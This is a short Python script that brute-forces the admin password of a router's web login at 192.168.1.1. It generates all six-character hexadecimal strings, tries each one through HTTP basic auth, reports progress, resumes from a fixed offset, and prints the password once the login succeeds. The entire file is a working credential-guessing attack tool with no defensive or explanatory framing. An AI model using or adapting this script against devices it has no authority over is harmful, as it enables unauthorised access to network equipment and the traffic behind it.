import requests
import time
import datetime

OFFSET = 1253377


def status(guess, guesses):
    print(f'{datetime.datetime.now().time()} - {guess} which is number {guesses.index(guess)} : {(OFFSET + guesses.index(guess)) / len(guesses) * 100}%')


def make_guess(guess, guesses, counter):
    try:
        if counter[0] >= 16**3:
            status(guess, guesses)
            counter[0] = 0

        res = requests.get('http://192.168.1.1', auth=('admin', guess))
        if res.status_code == 200:
            print(f'\n------------------\nFound password {guess}\n--------------------')
            exit(0)
        counter[0] += 1

    except KeyboardInterrupt:
        status(guess, guesses)
        input('Press enter')
        make_guess(guess, guesses, counter)

    except Exception as e:
        print(f'Other error with guess: {guess} -- {e}')
        time.sleep(1)
        make_guess(guess, guesses, counter)


def main():
    guesses = generate_guesses(OFFSET)
    print(f'Started at: {datetime.datetime.now().time()}')
    counter = [0]
    for guess in guesses:
        make_guess(guess, guesses, counter)


def main2():
    guesses = generate_guesses()
    guesses_trim = guesses[guesses.index('132000') : len(guesses)]
    with open('guesses.txt', 'w') as fh:
        fh.writelines([i + '\n' for i in guesses_trim])


def generate_guesses(offset=0):
    alphabet = '0123456789abcdef'

    guesses = []
    j = 1
    for i in range(len(alphabet)):
        c1 = alphabet[i]
        print(f'Generating --- {(i+1) / len(alphabet) * 100}% of the way there!')
        for c2 in alphabet:
            for c3 in alphabet:
                for c4 in alphabet:
                    for c5 in alphabet:
                        for c6 in alphabet:
                            if j >= offset:
                                guesses.append(c1+c2+c3+c4+c5+c6)
                            j += 1

    print(f'Generating --- {len(guesses)} guesses generated, first is {guesses[0]}\n')
    return guesses


if __name__ == '__main__':
    main()
